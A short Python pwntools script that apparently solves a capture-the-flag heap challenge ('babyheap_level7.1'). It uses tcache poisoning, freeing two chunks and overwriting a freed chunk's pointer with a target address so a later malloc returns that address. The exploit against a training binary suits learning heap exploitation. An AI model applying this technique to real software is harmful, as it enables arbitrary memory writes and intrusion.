from pwn import *

r = process('/challenge/babyheap_level7.1')

def malloc(idx,num):
    r.sendline(b'malloc')
    r.sendline(f'{idx}')
    r.sendline(f'{num}')

def free(idx):
    r.sendline(b'free')
    r.sendline(f'{idx}')    

def edit(idx,s):
    r.sendline(b'scanf')
    r.sendline(f'{idx}')
    r.sendline(s)


secret = 0x428e40

malloc(0,20)
malloc(1,20)
free(0)
free(1)
edit(1,p64(secret))
malloc(2,20)
malloc(3,20)


r.interactive()

